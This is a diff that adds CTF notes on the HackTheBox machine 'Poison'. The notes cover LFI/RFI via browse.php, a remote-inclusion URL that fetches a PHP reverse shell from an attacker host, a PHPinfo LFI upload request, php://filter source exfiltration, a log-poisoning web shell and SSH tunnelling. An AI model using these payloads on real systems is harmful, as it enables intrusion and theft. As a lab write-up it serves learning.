@@ -216,3 +216,64 @@ xkcd heartbleed
 python3 heartbleed.py -n 100 10.10.10.79
 tmux -S <socket-name>
 ```
+
+## 6. Poison
+
+### Approach Taken
+- run nmap scan differently this time by applying xsl stylesheet
+- examine the website & invoke various .php scripts
+- look if the phpinfo.php has file uploads turned on.
+- then burp the browse.php file & try to exfiltratre `ini.php` file
+- if you observe, browse.php has a Local File Inclusion Vulnerability
+- with that we want to check if has RFI as well. so, you host a webserver and have an PentestMonkey PHP reverse shell get Remote File included.`/browse.php?file=http://10.10.10.14/Anyfile` or check `/browse.php?file=ftp://10.10.10.14/Anyfile` or check `/browse.php?file=expect://ls` (code execution)
+- but we have found out that RFI cannot be done, but LFI can be done
+- You can do a `/browse.php?file=/etc/passwd` & the passwordfile already found, you could find the user and get an SSH but let us explore the LFI properly
+- search a `phpinfo lfi` & try out in burp how such lfi.py will work & how you can check the LFI on behalf of phpinfo.php is being exploited
+```
+Content-Type: multipart/form-data; boundary=--PleaseSubscribe
+Content-Length: 0
+
+--PleaseSubscribe
+Content-Disposition: form-data; name="anything"; filename="LeaveAComment"
+Content-Type: text/plain
+
+Please share my videos
+
+--PleaseSubscribe
+```
+- `python phplfi.py 10.10.10.84 80 100`
+- get the shell & go to apache directory
+- decode the user password & do an ssh
+- run linuxenum.sh & privilege escalate to root if you want
+- the log poison attack is to change the Agent to php-code (find in command used)
+
+### Lessons Learnt
+- LFI -> Local File Inclusion -> Include a file on the webserver and have your webserver execute it.
+- RFI -> Remote File Inclusion -> Have a PHP file or an executable file on your attack box and let the webserver load/execute it.
+- LFI way 1 -> Log Poisoning
+- `nmap xsl bootstrap` -> xsl stands for XML style sheet, run the command and open the `poison.xml` in a web browser
+- **Exfiltration of PHP code** - to convert files into base64 using php filter try this - `/browse.php?file=php://filter/convert.base64-encode/resource=index.php` - the catch here is if its going to get converted to base64 apache is not going read `<?php ?>` tags and therefore the invoked .php scripts doesn't get executed. And thus its a great way to exfiltrate php source code using this method. 
+- For RFI to work, in the PHP configuration you must have `allow_url_include` by be set in the configuration
+- Changing the type type of request to POST
+- Payload all the things  - download it!!
+- Log Poisioning is to be able to view the log file from the web & posion it by changing the Agent
+- konami ssh code - SANS blog
+- search for vnc password decrypt github
+
+
+### Commands used
+```
+nmap -sC -sV -oA poison --stylesheet nmap-bootstrap.xsl 10.10.10.84
+firefox poison.xml
+
+<?php echo 'Please Subscribe' ?>
+<?php system($\_REQUEST['ippsec']);?>
+
+/browse.php?file=/var/log/httpd-access.log?ippsec=uname-a
+
+proxy traffic through ssh via 1080 port & open up 6801 for 5801 on the target box
+ssh -D 1080 -L6801:127.0.0.1:5801 -L6901:127.0.0.1:6901 charix@10.10.10.84
+
+vncviewer 127.0.0.1::6901
+
+```
